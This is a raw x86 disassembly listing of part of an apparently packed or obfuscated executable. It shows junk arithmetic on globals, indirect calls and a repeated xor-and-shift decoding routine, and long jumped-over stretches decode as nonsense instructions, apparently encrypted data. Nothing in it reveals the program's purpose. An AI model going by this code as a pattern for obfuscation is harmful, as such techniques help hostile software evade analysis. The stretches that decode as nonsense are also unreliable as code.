  413672:	push   DWORD PTR [ebp-0x1c]
  413675:	push   DWORD PTR [ebp-0x20]
  413678:	push   DWORD PTR [ebp-0x14]
  41367b:	push   0x6fca
  413680:	push   DWORD PTR [ebp-0x14]
  413683:	push   0x1843
  413688:	call   DWORD PTR ds:0x42e014
  41368e:	movzx  ecx,BYTE PTR ds:0x42841d
  413695:	and    DWORD PTR ds:0x428539,ecx
  41369b:	sbb    ecx,0x7147
  4136a1:	and    DWORD PTR ds:0x4284b5,ebx
  4136a7:	mov    ecx,DWORD PTR ds:0x428465
  4136ad:	add    DWORD PTR ds:0x42840d,ecx
  4136b3:	and    DWORD PTR ds:0x42835d,0x5196
  4136bd:	mov    eax,ds:0x4226f8
  4136c2:	adc    DWORD PTR ds:0x428415,0x635d
  4136cc:	mov    DWORD PTR [ebp-0xc],eax
  4136cf:	cmp    DWORD PTR ds:0x4284c1,0x0
  4136d6:	mov    DWORD PTR ds:0x428335,0x6dcc
  4136e0:	mov    ecx,DWORD PTR ds:0x428431
  4136e6:	jmp    0x413753
  4136eb:	mov    DWORD PTR ds:0x4284cd,0x2cf
  4136f5:	mov    DWORD PTR ds:0x428571,0x621d
  4136ff:	cmp    DWORD PTR ds:0x4284c1,0x0
  413706:	jbe    0x41373d
  41370c:	push   0x4284c1
  413711:	push   0x4283f5
  413716:	push   0x2216
  41371b:	call   DWORD PTR ds:0x42e258
  413721:	and    ecx,ecx
  413723:	mov    ecx,DWORD PTR ds:0x42839d
  413729:	mov    ecx,DWORD PTR [ecx]
  41372b:	add    DWORD PTR ds:0x42835d,ecx
  413731:	or     ecx,ecx
  413733:	sbb    DWORD PTR ds:0x4284dd,0x6873
  41373d:	sbb    DWORD PTR ds:0x4284e5,ecx
  413743:	adc    DWORD PTR ds:0x428461,0x1149
  41374d:	or     DWORD PTR ds:0x4284e1,edx
  413753:	mov    eax,DWORD PTR [ebp-0x28]
  413756:	cmp    DWORD PTR ds:0x428445,0x0
  41375d:	mov    ecx,0xa9f
  413762:	mov    DWORD PTR ds:0x42840d,0x1875
  41376c:	mov    DWORD PTR ds:0x4284e1,0x319d
  413776:	jmp    0x41383a
  41377b:	mov    DWORD PTR ds:0x4284d1,0x86c
  413785:	cmp    DWORD PTR ds:0x428445,0x0
  41378c:	jle    0x4137bf
  413792:	push   0x50b5
  413797:	call   DWORD PTR ds:0x42e25c
  41379d:	add    DWORD PTR ds:0x428355,0x737d
  4137a7:	sub    ecx,DWORD PTR ds:0x4284e1
  4137ad:	mov    ecx,DWORD PTR ds:0x428555
  4137b3:	xor    ecx,DWORD PTR ds:0x428421
  4137b9:	mov    DWORD PTR ds:0x428555,ecx
  4137bf:	inc    ecx
  4137c0:	movzx  ecx,BYTE PTR ds:0x428355
  4137c7:	sub    ecx,DWORD PTR ds:0x4284c1
  4137cd:	mov    DWORD PTR ds:0x428355,ecx
  4137d3:	cmp    DWORD PTR ds:0x42843d,0x0
  4137da:	not    ecx
  4137dc:	mov    DWORD PTR ds:0x4283fd,0x5561
  4137e6:	jmp    0x41383a
  4137eb:	mov    DWORD PTR ds:0x428571,0x2772
  4137f5:	cmp    DWORD PTR ds:0x42843d,0x0
  4137fc:	jle    0x41381e
  413802:	push   0x5196
  413807:	push   0x4281ff
  41380c:	call   DWORD PTR ds:0x42e260
  413812:	sbb    DWORD PTR ds:0x428359,ecx
  413818:	xor    ecx,DWORD PTR ds:0x42856d
  41381e:	and    DWORD PTR ds:0x42842d,edi
  413824:	inc    DWORD PTR ds:0x428441
  41382a:	add    DWORD PTR ds:0x428349,0x3293
  413834:	or     DWORD PTR ds:0x428415,ecx
  41383a:	mov    DWORD PTR [ebp-0x24],eax
  41383d:	mov    ecx,DWORD PTR [ebp-0x24]
  413840:	push   0x4
  413842:	sub    DWORD PTR ds:0x4284cd,0x4aeb
  41384c:	pop    eax
  41384d:	sbb    DWORD PTR ds:0x42854d,0x428349
  413857:	sub    eax,ecx
  413859:	cmp    DWORD PTR ds:0x428361,0x0
  413860:	mov    ecx,DWORD PTR ds:0x4284e1
  413866:	not    ecx
  413868:	movzx  ecx,BYTE PTR ds:0x428339
  41386f:	mov    ecx,DWORD PTR ds:0x428455
  413875:	jmp    0x4138c3
  41387a:	mov    DWORD PTR ds:0x4284d1,0x61cd
  413884:	cmp    DWORD PTR ds:0x428361,0x0
  41388b:	je     0x4138b5
  413891:	push   0x4284d5
  413896:	push   0x4282cf
  41389b:	call   DWORD PTR ds:0x42e264
  4138a1:	or     DWORD PTR ds:0x428451,0x428415
  4138ab:	mov    DWORD PTR ds:0x428411,0x2055
  4138b5:	sub    ecx,DWORD PTR ds:0x42844d
  4138bb:	or     ecx,DWORD PTR ds:0x4283fd
  4138c1:	neg    ecx
  4138c3:	mov    ecx,DWORD PTR [ebp-0x20]
  4138c6:	add    ecx,eax
  4138c8:	mov    DWORD PTR [ebp-0x30],ecx
  4138cb:	lea    eax,[ebp-0x3c]
  4138ce:	mov    DWORD PTR [ebp-0x38],eax
  4138d1:	mov    eax,DWORD PTR [ebp-0x18]
  4138d4:	mov    ecx,DWORD PTR [ebp-0x18]
  4138d7:	xor    eax,edi
  4138d9:	xor    ecx,ebx
  4138db:	shr    eax,0x2
  4138de:	shl    ecx,0x1e
  4138e1:	or     eax,ecx
  4138e3:	mov    DWORD PTR [ebp-0x2c],eax
  4138e6:	mov    DWORD PTR [ebp-0x8],0xa5069bbe
  4138ed:	mov    eax,DWORD PTR [ebp-0x8]
  4138f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4138f3:	xor    eax,edi
  4138f5:	xor    ecx,ebx
  4138f7:	shr    eax,0x2
  4138fa:	shl    ecx,0x1e
  4138fd:	or     ecx,eax
  4138ff:	push   ecx
  413900:	lea    eax,[ebp-0x8]
  413903:	push   eax
  413904:	lea    eax,[ebp-0x80]
  413907:	push   eax
  413908:	call   0x411c08
  41390d:	mov    eax,DWORD PTR [ebp-0x8]
  413910:	mov    ecx,DWORD PTR [ebp-0x8]
  413913:	xor    eax,edi
  413915:	xor    ecx,ebx
  413917:	shr    eax,0x2
  41391a:	shl    ecx,0x1e
  41391d:	or     ecx,eax
  41391f:	push   ecx
  413920:	lea    eax,[ebp-0x24]
  413923:	push   eax
  413924:	mov    eax,DWORD PTR [ebp+0x8]
  413927:	mov    ecx,DWORD PTR [ebp+0xc]
  41392a:	shrd   eax,ecx,0x2
  41392e:	shr    ecx,0x2
  413931:	mov    ecx,DWORD PTR [ebp+0x8]
  413934:	mov    edx,DWORD PTR [ebp+0xc]
  413937:	xor    eax,esi
  413939:	xor    edx,edx
  41393b:	or     eax,edx
  41393d:	lea    eax,[ebp+eax*4-0x7c]
  413941:	push   eax
  413942:	shl    ecx,0x1e
  413945:	call   0x411c08
  41394a:	mov    eax,DWORD PTR [ebp-0x8]
  41394d:	mov    ecx,DWORD PTR [ebp-0x8]
  413950:	xor    eax,edi
  413952:	xor    ecx,ebx
  413954:	shr    eax,0x2
  413957:	shl    ecx,0x1e
  41395a:	or     ecx,eax
  41395c:	push   ecx
  41395d:	lea    eax,[ebp-0x30]
  413960:	push   eax
  413961:	jmp    0x413c9a
  413966:	in     eax,dx
  413967:	dec    edi
  413968:	ret    
  413969:	in     al,dx
  41396a:	fs jl  0x413963
  41396d:	pop    ebx
  41396e:	push   0x24e3e744
  413973:	add    ebp,DWORD PTR [edx-0x2f]
  413976:	in     al,dx
  413977:	xchg   BYTE PTR [esi-0x413b1242],bh
  41397d:	mov    esi,0xd979e07d
  413982:	adc    DWORD PTR [edx+0x7f],ebp
  413985:	xchg   ecx,eax
  413986:	imul   esp,DWORD PTR [edi-0x61],0x8089b641
  41398d:	jns    0x413913
  41398f:	retf   0x8404
  413992:	inc    edi
  413993:	call   0x4896:0x5c129e98
  41399a:	ret    0x771f
  41399d:	popa   
  41399e:	pusha  
  41399f:	cmp    eax,0x6224295e
  4139a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139a5:	fwait
  4139a6:	xchg   ecx,eax
  4139a7:	xor    BYTE PTR [ebx+0x26],ch
  4139aa:	and    DWORD PTR [ebp-0x3a],ebp
  4139ad:	icebp  
  4139ae:	adc    ecx,DWORD PTR [edi+0x271f4171]
  4139b4:	adc    al,0x61
  4139b6:	xchg   ebx,eax
  4139b7:	inc    esi
  4139b8:	or     eax,edx
  4139ba:	sub    BYTE PTR [ebp-0x7b],0xff
  4139be:	fisttp DWORD PTR [ebx+0x79a4e5cc]
  4139c4:	sub    esp,DWORD PTR [edx]
  4139c6:	sub    dh,BYTE PTR [edx+0x1d446e30]
  4139cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139cd:	(bad)  
  4139ce:	and    bl,BYTE PTR [eax]
  4139d0:	inc    esi
  4139d1:	enter  0xb288,0x70
  4139d5:	dec    ebx
  4139d6:	fcom   QWORD PTR [ebx-0x2c]
  4139d9:	mov    ebx,0xce1c2b06
  4139de:	ja     0x4139f1
  4139e0:	lahf   
  4139e1:	sub    eax,0x22697baf
  4139e6:	int3   
  4139e7:	mov    ds:0x82720740,al
  4139ec:	add    ch,BYTE PTR [edi+eax*4]
  4139ef:	lods   al,BYTE PTR ds:[esi]
  4139f0:	mov    edx,0x4c3aeac2
  4139f5:	pop    esp
  4139f6:	mov    WORD PTR [edi],?
  4139f8:	(bad)  
  4139f9:	jge    0x4139b9
  4139fb:	jno    0x4139dc
  4139fd:	sub    DWORD PTR ds:0xc2704291,0x23
  413a04:	adc    ecx,DWORD PTR [ebx+edi*1+0x616e4c62]
  413a0b:	rcr    BYTE PTR [ebp+0x569fbeb5],1
  413a11:	xor    ch,bl
  413a13:	xchg   esi,eax
  413a14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a15:	inc    ebx
  413a16:	mov    esi,esp
  413a18:	or     DWORD PTR [eax+0x539c0b10],ebp
  413a1e:	sub    edx,0x78
  413a21:	cs mov ebx,0xf67a73fe
  413a27:	mov    ds:0x9155afff,eax
  413a2c:	adc    DWORD PTR cs:[ebp-0x66f38d41],ecx
  413a33:	sub    al,0x5b
  413a35:	push   0xffffffba
  413a37:	push   esp
  413a38:	jns    0x413a62
  413a3a:	jmp    0x57315a3c
  413a3f:	push   edx
  413a40:	sahf   
  413a41:	sbb    al,BYTE PTR [ebx-0x997822]
  413a47:	jo     0x413a1d
  413a49:	ds out dx,al
  413a4b:	out    dx,eax
  413a4c:	xchg   ebp,eax
  413a4d:	xor    BYTE PTR [edx+0x50],dh
  413a50:	and    DWORD PTR [edi+0x22],ebp
  413a53:	xchg   BYTE PTR [ecx],bh
  413a55:	mov    ebp,cr7
  413a58:	imul   BYTE PTR [edi-0x4eabdacb]
  413a5e:	adc    al,0x7a
  413a60:	push   es
  413a61:	xchg   ecx,eax
  413a62:	sub    eax,0x8c898294
  413a67:	enter  0xb563,0x2a
  413a6b:	mov    esp,0xccee2c5a
  413a70:	shl    ah,0xb
  413a73:	daa    
  413a74:	lods   al,BYTE PTR ds:[esi]
  413a75:	mov    dl,0x8
  413a77:	ds cli 
  413a79:	daa    
  413a7a:	xor    DWORD PTR [ebx+0x74],eax
  413a7d:	or     al,0xd6
  413a7f:	mov    DWORD PTR [eax],0x6226f72c
  413a85:	mov    bl,0xb7
  413a87:	cdq    
  413a88:	aas    
  413a89:	inc    esp
  413a8a:	lahf   
  413a8b:	sbb    ecx,esi
  413a8d:	ret    0xe9d6
  413a90:	test   al,0x1a
  413a92:	add    eax,0xd09c107f
  413a97:	shl    BYTE PTR [ecx],cl
  413a99:	jl     0x413a61
  413a9b:	retf   
  413a9c:	jge    0x413a2a
  413a9e:	mov    esi,ss
  413aa0:	in     eax,0x1c
  413aa2:	arpl   WORD PTR [edi],bx
  413aa4:	jl     0x413a4a
  413aa6:	pop    ebx
  413aa7:	push   ebx
  413aa8:	and    al,0x59
  413aaa:	test   eax,0x77f07872
  413aaf:	dec    esi
  413ab0:	jae    0x413aff
  413ab2:	mov    ds:0x7b5152d7,eax
  413ab7:	pop    ds
  413ab8:	mov    cl,0xca
  413aba:	arpl   ax,bx
  413abc:	push   es
  413abd:	inc    esi
  413abe:	pop    ds
  413abf:	and    eax,0x4eaa293b
  413ac4:	rol    ecx,1
  413ac6:	and    BYTE PTR [ecx+0x15],dl
  413ac9:	(bad)  
  413aca:	aaa    
  413acb:	inc    esi
  413acc:	aaa    
  413acd:	repz jmp 0xc3db2950
  413ad3:	jmp    0x413afb
  413ad5:	jecxz  0x413ae1
  413ad7:	sub    dl,BYTE PTR [edx]
  413ad9:	sahf   
  413ada:	cmp    bh,BYTE PTR [eax-0x7b]
  413add:	xchg   ebp,eax
  413ade:	add    eax,0xfe741934
  413ae3:	loopne 0x413b46
  413ae5:	inc    ecx
  413ae6:	pop    ds
  413ae7:	js     0x413a96
  413ae9:	push   edi
  413aea:	mov    al,ds:0x840aecb9
  413aef:	xchg   ebx,eax
  413af0:	pop    ds
  413af1:	lock gs sbb bh,al
  413af5:	sub    dl,BYTE PTR [edx]
  413af7:	push   esi
  413af8:	in     al,0x74
  413afa:	mov    dh,0xe6
  413afc:	push   esp
  413afd:	call   0xcea9:0x29f8ecaa
  413b04:	jecxz  0x413b46
  413b06:	leave  
  413b07:	popa   
  413b08:	sub    DWORD PTR [ebx],ebx
  413b0a:	add    eax,0xcf7f8d90
  413b0f:	pop    edi
  413b10:	jae    0x413b69
  413b12:	je     0x413af0
  413b14:	add    dl,BYTE PTR ds:0x493c847e
  413b1a:	mov    esp,0xed90e4c9
  413b1f:	cmp    bh,al
  413b21:	cmp    BYTE PTR [edx-0x50],dh
  413b24:	cwde   
  413b25:	inc    BYTE PTR [ebp+0x3]
  413b28:	lea    ecx,[edi+0x1e]
  413b2b:	mov    cl,0x6b
  413b2d:	les    eax,FWORD PTR [edx]
  413b2f:	scas   eax,DWORD PTR es:[edi]
  413b30:	lods   eax,DWORD PTR ds:[esi]
  413b31:	stos   BYTE PTR es:[edi],al
  413b32:	aam    0x12
  413b34:	int3   
  413b35:	sbb    al,0x56
  413b37:	mov    dh,0xac
  413b39:	leave  
  413b3a:	or     BYTE PTR [ecx],dh
  413b3c:	pop    edx
  413b3d:	push   ebp
  413b3e:	dec    esi
  413b3f:	ror    ebx,cl
  413b41:	lock jno 0x413b76
  413b44:	lods   eax,DWORD PTR ds:[esi]
  413b45:	addr16 mov cl,0xb6
  413b48:	ret    0xfb5d
  413b4b:	push   ebp
  413b4c:	xor    cl,BYTE PTR [edx+0x22ca1a3]
  413b52:	jns    0x413b8b
  413b54:	loop   0x413b90
  413b56:	mov    bl,0xb8
  413b58:	out    dx,eax
  413b59:	xor    al,BYTE PTR [esi+0x677900cb]
  413b5f:	retf   
  413b60:	rcr    DWORD PTR [eax],cl
  413b62:	sbb    edi,edi
  413b64:	iret   
  413b65:	jae    0x413b33
  413b67:	test   eax,0xaa5e154f
  413b6c:	jp     0x413b44
  413b6e:	mov    ds:0xae4d1da1,al
  413b73:	adc    DWORD PTR [eax+0xf0cd558],eax
  413b79:	sbb    BYTE PTR [esi+edx*1],al
  413b7c:	pop    edi
  413b7d:	enter  0x3ac1,0x2d
  413b81:	test   BYTE PTR [ecx],al
  413b83:	push   edx
  413b84:	jo     0x413b78
  413b86:	xlat   BYTE PTR ds:[ebx]
  413b87:	out    dx,eax
  413b88:	or     DWORD PTR [eax-0x24],edx
  413b8b:	adc    esi,DWORD PTR [edx-0x64]
  413b8e:	jmp    0x4cc923dd
  413b93:	scas   eax,DWORD PTR es:[edi]
  413b94:	enter  0x87ef,0xb0
  413b98:	adc    eax,0x290b1859
  413b9d:	jge    0x413b83
  413b9f:	sbb    ebp,DWORD PTR [esi+0x358a06d7]
  413ba5:	(bad)  
  413ba6:	idiv   DWORD PTR [edx+esi*2+0x74]
  413baa:	cmp    al,BYTE PTR [edx+eax*2+0x5099c2bf]
  413bb1:	cdq    
  413bb2:	sbb    DWORD PTR [edi+0x35],esp
  413bb5:	stos   BYTE PTR es:[edi],al
  413bb6:	jmp    0x19ac66ce
  413bbb:	mov    edx,0x68a25de5
  413bc0:	adc    eax,0xe9fdc7e8
  413bc5:	dec    edi
  413bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bc7:	out    dx,eax
  413bc8:	jmp    0xd8b:0x555b2294
  413bcf:	(bad)
  413bd2:	pushf  
  413bd3:	cld    
  413bd4:	mov    esi,0x927c50dd
  413bd9:	shl    DWORD PTR [ebp+0x2596883e],cl
  413bdf:	loop   0x413bb1
  413be1:	fmul   QWORD PTR [eax+ecx*4+0x2f]
  413be5:	add    eax,0x6ee9fe61
  413bea:	imul   eax,DWORD PTR [ebp+0x6],0x3b
  413bee:	fwait
  413bef:	leave  
  413bf0:	mov    DWORD PTR [ebp-0x33aeef79],edi
  413bf6:	popa   
  413bf7:	lods   eax,DWORD PTR ds:[esi]
  413bf8:	cs loope 0x413c1d
  413bfb:	cmp    DWORD PTR [ebp-0x547e3791],edx
  413c01:	and    DWORD PTR [ecx-0x6e],ebx
  413c04:	sub    edx,DWORD PTR ds:0x502f70d5
  413c0a:	mov    ebx,DWORD PTR ss:[edx+ebp*1]
  413c0e:	jne    0x413c43
  413c10:	pop    es
  413c11:	mov    al,0x58
  413c13:	popa   
  413c14:	sbb    DWORD PTR [edi-0x68],ebp
  413c17:	mov    ch,0x15
  413c19:	lods   eax,DWORD PTR ds:[esi]
  413c1a:	daa    
  413c1b:	(bad)  
  413c1c:	jae    0x413bfa
  413c1e:	xchg   ebx,eax
  413c1f:	cli    
  413c20:	adc    eax,0xac3d5f24
  413c25:	pop    es
  413c26:	std    
  413c27:	push   esp
  413c28:	dec    esi
  413c29:	adc    eax,0xd1352632
  413c2e:	adc    BYTE PTR [ebx+0x6e462965],bh
  413c34:	adc    eax,0x7a52a41f
  413c39:	xor    eax,esi
  413c3b:	(bad)  
  413c3c:	repnz sbb ecx,ebx
  413c3f:	and    BYTE PTR [esi-0x4e440f22],0x73
  413c46:	leave  
  413c47:	or     bl,dh
  413c49:	idiv   DWORD PTR [ebx+0x45a89890]
  413c4f:	sub    al,0xdc
  413c51:	in     eax,0x50
  413c53:	retf   
  413c54:	push   ebp
  413c55:	je     0x413cb8
  413c57:	mov    ah,0x31
  413c59:	test   eax,0x223614ee
  413c5e:	add    eax,0xb9c8b80a
  413c63:	imul   esp,DWORD PTR [esi+ecx*2-0x77],0x19
  413c68:	(bad)  
  413c6a:	sbb    edx,esi
  413c6c:	lds    eax,FWORD PTR [ebp-0xb]
  413c6f:	das    
  413c70:	cs pop ecx
  413c72:	pop    ebp
  413c73:	popa   
  413c74:	add    BYTE PTR [esi-0x69],0xd2
  413c78:	retf   0x2400
  413c7b:	out    0x80,al
  413c7d:	lods   al,BYTE PTR ds:[esi]
  413c7e:	jns    0x413c8d
  413c80:	mov    ah,0x5e
  413c82:	sbb    eax,0xf9573b42
  413c87:	and    edx,DWORD PTR [esi+0x19]
  413c8a:	push   ecx
  413c8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c8c:	fsub   DWORD PTR [edx]
  413c8e:	sbb    al,0xbe
  413c90:	jle    0x413d05
  413c92:	jb     0x413c51
  413c94:	inc    ebx
  413c95:	jecxz  0x413c26
  413c97:	mov    ch,0x8f
  413c99:	pusha  
  413c9a:	mov    eax,DWORD PTR [ebp+0x10]
  413c9d:	mov    ecx,DWORD PTR [ebp+0x14]
  413ca0:	shrd   eax,ecx,0x2
  413ca4:	shr    ecx,0x2
  413ca7:	mov    ecx,DWORD PTR [ebp+0x10]
  413caa:	mov    edx,DWORD PTR [ebp+0x14]
  413cad:	xor    eax,esi
  413caf:	xor    edx,edx
  413cb1:	or     eax,edx
  413cb3:	lea    eax,[ebp+eax*4-0x7c]
  413cb7:	push   eax
  413cb8:	shl    ecx,0x1e
  413cbb:	call   0x411c08
  413cc0:	mov    eax,DWORD PTR [ebp-0x8]
  413cc3:	mov    ecx,DWORD PTR [ebp-0x8]
  413cc6:	xor    ecx,ebx
  413cc8:	xor    eax,edi
  413cca:	shl    ecx,0x1e
  413ccd:	shr    eax,0x2
  413cd0:	or     ecx,eax
  413cd2:	push   ecx
  413cd3:	lea    eax,[ebp-0x2c]
  413cd6:	push   eax
  413cd7:	mov    eax,DWORD PTR [ebp+0x10]
  413cda:	mov    ecx,DWORD PTR [ebp+0x14]
  413cdd:	shrd   eax,ecx,0x2
  413ce1:	shr    ecx,0x2
  413ce4:	mov    ecx,DWORD PTR [ebp+0x10]
  413ce7:	mov    edx,DWORD PTR [ebp+0x14]
  413cea:	xor    edx,edx
  413cec:	xor    eax,esi
  413cee:	or     eax,edx
  413cf0:	shl    ecx,0x1e
  413cf3:	mov    ecx,DWORD PTR [ebp+0x10]
  413cf6:	mov    edx,DWORD PTR [ebp+0x14]
  413cf9:	shrd   ecx,edx,0x2
  413cfd:	shr    edx,0x2
  413d00:	mov    edx,DWORD PTR [ebp+0x10]
  413d03:	mov    ebx,DWORD PTR [ebp+0x14]
  413d06:	xor    ecx,esi
  413d08:	xor    ebx,ebx
  413d0a:	or     ecx,ebx
  413d0c:	add    eax,ecx
  413d0e:	lea    eax,[ebp+eax*4-0x7c]
  413d12:	push   eax
  413d13:	shl    edx,0x1e
  413d16:	call   0x411c08
  413d1b:	mov    eax,DWORD PTR [ebp-0x8]
  413d1e:	mov    ecx,DWORD PTR [ebp-0x8]
  413d21:	xor    ecx,0xfffffffe
  413d24:	shl    ecx,0x1e
  413d27:	xor    eax,edi
  413d29:	shr    eax,0x2
  413d2c:	or     ecx,eax
  413d2e:	push   ecx
  413d2f:	lea    eax,[ebp-0x38]
  413d32:	push   eax
  413d33:	mov    eax,DWORD PTR [ebp+0x10]
  413d36:	mov    ecx,DWORD PTR [ebp+0x14]
  413d39:	shrd   eax,ecx,0x2
  413d3d:	shr    ecx,0x2
  413d40:	jmp    0x414079
  413d45:	lock aad 0x95
  413d48:	dec    ecx
  413d49:	mov    bh,0x8a
  413d4b:	xor    al,0x7c
  413d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d4e:	cmp    eax,0xa457dd72
  413d53:	and    al,0x9e
  413d55:	sbb    ecx,DWORD PTR [esi+edi*4-0x413b1242]
  413d5c:	mov    esi,0x8b5061f0
  413d61:	(bad)  
  413d62:	arpl   WORD PTR [ecx+edx*1+0x29715a1c],cx
  413d69:	repz xor DWORD PTR [edx-0x12],ebx
  413d6d:	stos   BYTE PTR es:[edi],al
  413d6e:	iret   
  413d6f:	sbb    eax,0x1c7c32ad
  413d74:	out    0x5e,al
  413d76:	lods   eax,DWORD PTR ds:[esi]
  413d77:	ret    
  413d78:	(bad)  
  413d79:	(bad)  [esi]
  413d7b:	and    dh,ch
  413d7d:	dec    esi
  413d7e:	fiadd  WORD PTR [esi]
  413d80:	push   ecx
  413d81:	aad    0x90
  413d83:	mov    ch,0xd3
  413d85:	jbe    0x413d15
  413d87:	adc    BYTE PTR ds:0xdb5e44d0,0x63
  413d8e:	mov    edi,ecx
  413d90:	pop    ds
  413d91:	(bad)  
  413d92:	ss das 
  413d94:	scas   al,BYTE PTR es:[edi]
  413d95:	fist   WORD PTR [esi+0x60f97ec6]
  413d9b:	sub    eax,0xb1848211
  413da0:	mov    ch,0x55
  413da2:	xor    cl,BYTE PTR [edx]
  413da4:	pop    edi
  413da5:	mov    bl,0xee
  413da7:	test   BYTE PTR [ebx],ah
  413da9:	fcom   QWORD PTR [ecx+0x2d3dad87]
  413daf:	or     al,0x65
  413db1:	mov    bh,0x34
  413db3:	stos   DWORD PTR es:[edi],eax
  413db4:	and    ebx,edx
  413db6:	fidiv  DWORD PTR [edx]
  413db8:	test   eax,0x1b1c6d52
  413dbd:	lods   al,BYTE PTR ds:[esi]
  413dbe:	adc    eax,0x5ac6f0c8
  413dc3:	mov    ch,0x63
  413dc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dc6:	jns    0x413e36
  413dc8:	imul   edx,DWORD PTR [eax-0x638c749b],0x1b076aec
  413dd2:	adc    esp,DWORD PTR es:[esi+ebp*1]
  413dd6:	stos   BYTE PTR es:[edi],al
  413dd7:	(bad)  
  413dd8:	pop    ss
  413dd9:	(bad)  
  413dda:	retf   
  413ddb:	std    
  413ddc:	lds    ebx,FWORD PTR [ebx+edx*2]
  413ddf:	(bad)  
  413de0:	scas   eax,DWORD PTR es:[edi]
  413de1:	inc    edi
  413de2:	lock push ss
  413de4:	add    DWORD PTR [edi+0x23],ebp
  413de7:	push   cs
  413de8:	addr16 mov ecx,0x2b603d83
  413dee:	cli    
  413def:	std    
  413df0:	sti    
  413df1:	push   esi
  413df2:	imul   edi,DWORD PTR [edi-0x7e9c6757],0xffffffc2
  413df9:	push   edi
  413dfa:	and    al,0xbd
  413dfc:	add    bl,BYTE PTR [esi-0x7a2d0b34]
  413e02:	leave  
  413e03:	xchg   BYTE PTR [edi+ebp*1],ch
  413e06:	test   DWORD PTR [ebp+0x0],esp
  413e09:	fisttp DWORD PTR fs:[ebx]
  413e0c:	push   eax
  413e0d:	pop    edi
  413e0e:	or     DWORD PTR [edi+0x63],edx
  413e11:	test   eax,0xf6f29ebf
  413e16:	inc    ecx
  413e17:	iret   
  413e18:	icebp  
  413e19:	dec    ebp
  413e1a:	hlt    
  413e1b:	outs   dx,DWORD PTR ds:[esi]
  413e1c:	les    esi,FWORD PTR [esi-0x54f3526e]
  413e22:	mov    bl,0xec
  413e24:	adc    eax,0x826ea663
  413e29:	fsubr  st,st(0)
  413e2b:	or     al,BYTE PTR [ebx+0x48]
  413e2e:	dec    BYTE PTR [edi+0x765da504]
  413e34:	fcom   DWORD PTR [edx-0x5e]
  413e37:	ret    0xfbb
  413e3a:	cdq    
  413e3b:	cs jae 0x413e0c
  413e3e:	inc    esi
  413e3f:	loop   0x413e69
  413e41:	jge    0x413e8a
  413e43:	out    dx,al
  413e44:	dec    ebx
  413e45:	test   al,0xfc
  413e47:	mov    ebx,0x2427d6e0
  413e4c:	mov    al,ds:0x9c4099cb
  413e51:	xor    BYTE PTR [edi+edi*4+0x7287a13b],0x41
  413e59:	data16 test al,0xb3
  413e5c:	xor    al,0x9e
  413e5e:	and    DWORD PTR [eax+0x43],edi
  413e61:	sbb    BYTE PTR fs:[ebp-0x3075ebe0],al
  413e68:	mov    dh,0xcf
  413e6a:	mov    WORD PTR [ecx+0x6c],?
  413e6d:	push   cs
  413e6e:	xchg   edi,eax
  413e6f:	cmp    dh,al
  413e71:	xor    eax,0xf8dd570c
  413e76:	bound  esp,QWORD PTR [esp+ebx*1-0x40]
  413e7a:	loop   0x413edf
  413e7c:	int3   
  413e7d:	jnp    0x413e18
  413e7f:	ins    BYTE PTR es:[edi],dx
  413e80:	repz mov edi,0x9265d368
  413e86:	cli    
  413e87:	xor    eax,0xed54ac1b
  413e8c:	mov    esi,0xc8667f31
  413e91:	bound  ebx,QWORD PTR [eax+0x53]
  413e94:	in     eax,dx
  413e95:	test   DWORD PTR [edx-0x3aeb2b77],ecx
  413e9b:	mov    cl,0xd4
  413e9d:	cmc    
  413e9e:	call   0x691c900c
  413ea3:	outs   dx,BYTE PTR ds:[esi]
  413ea4:	mov    ds:0xd2f97e7a,al
  413ea9:	ss inc ebx
  413eab:	xchg   ecx,eax
  413eac:	push   es
  413ead:	(bad)  
  413eae:	js     0x413f18
  413eb0:	jl     0x413e3a
  413eb2:	add    DWORD PTR [eax-0x2afdf385],ebx
  413eb8:	sahf   
  413eb9:	cwde   
  413eba:	adc    edx,ecx
  413ebc:	das    
  413ebd:	add    eax,0xd6582eb
  413ec2:	fcomp  DWORD PTR [esp+edx*8-0x31]
  413ec6:	mov    ebp,0x367e6c7d
  413ecb:	lahf   
  413ecc:	std    
  413ecd:	cmc    
  413ece:	fucom  st(3)
  413ed0:	das    
  413ed1:	jnp    0x413f42
  413ed3:	add    BYTE PTR [esi+eax*1],0x98
  413ed7:	clc    
  413ed8:	mul    DWORD PTR [ecx+ebp*1]
  413edb:	call   0x3f7c:0x8f6e681
  413ee2:	int3   
  413ee3:	mov    es,WORD PTR [edx+0x0]
  413ee6:	push   ds
  413ee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ee8:	es aaa 
  413eea:	in     eax,dx
  413eeb:	push   ds
  413eec:	xchg   edx,eax
  413eed:	add    ebx,DWORD PTR [ebp+0x48]
  413ef0:	pop    ss
  413ef1:	xchg   BYTE PTR [edi+0x197e4328],dh
  413ef7:	or     esi,DWORD PTR [esi-0x55c0f58a]
  413efd:	jo     0x413f5a
  413eff:	ds scas al,BYTE PTR es:[edi]
  413f01:	test   al,0x53
  413f03:	push   edi
  413f04:	js     0x413ec0
  413f06:	xchg   ebp,eax
  413f07:	imul   eax,edx,0xfffffffd
  413f0a:	sbb    al,0x68
  413f0c:	sub    DWORD PTR [ebx+0x47],ebx
  413f0f:	mov    WORD PTR [ecx+0x34],ds
  413f12:	shl    cl,cl
  413f14:	sar    DWORD PTR [edx+0x24],1
  413f17:	inc    edi
  413f18:	mov    cl,0x60
  413f1a:	shl    DWORD PTR [ebp-0x3a131d84],1
  413f20:	gs xchg ecx,eax
  413f22:	jae    0x413f2b
  413f24:	ds call 0x944f:0xd21bdad3
  413f2c:	pop    eax
  413f2d:	lods   al,BYTE PTR ds:[esi]
  413f2e:	adc    DWORD PTR [ebx-0x566214cd],ebx
  413f34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f35:	push   ecx
  413f36:	sub    DWORD PTR [eax-0x70],eax
  413f39:	loope  0x413f9d
  413f3b:	cmp    al,0xcd
  413f3d:	int3   
  413f3e:	sahf   
  413f3f:	sar    BYTE PTR [edx],cl
  413f41:	(bad)  
  413f42:	fwait
